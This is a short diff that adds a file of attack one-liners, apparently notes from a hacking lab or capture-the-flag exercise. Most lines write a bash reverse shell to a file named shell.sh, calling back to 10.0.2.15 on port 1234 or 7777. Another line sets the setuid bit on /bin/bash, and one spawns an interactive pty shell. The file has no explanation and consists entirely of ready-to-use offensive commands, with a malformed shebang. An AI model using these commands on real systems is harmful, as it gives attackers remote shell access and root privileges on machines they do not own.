@@ -1,0 +1,12 @@
+echo '#/!bin/bash\n/bin/bash -c "bash -i >& /dev/tcp/10.0.2.15/1234 0>&1"' > shell.sh
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+echo '/bin/bash -c "bash -i >& /dev/tcp/10.0.2.15/7777 0>&1"' > shell.sh
+
+echo '#/!bin/bash\nchmod +s /bin/bash' > shell.sh
+
+echo '/bin/bash -c "bash -i >& /dev/tcp/10.0.2.15/7777 0>&1"' > shell.sh
+
+echo "bash -c 'bash -i >& /dev/tcp/10.0.2.15/7777 0>&1'" > shell.sh
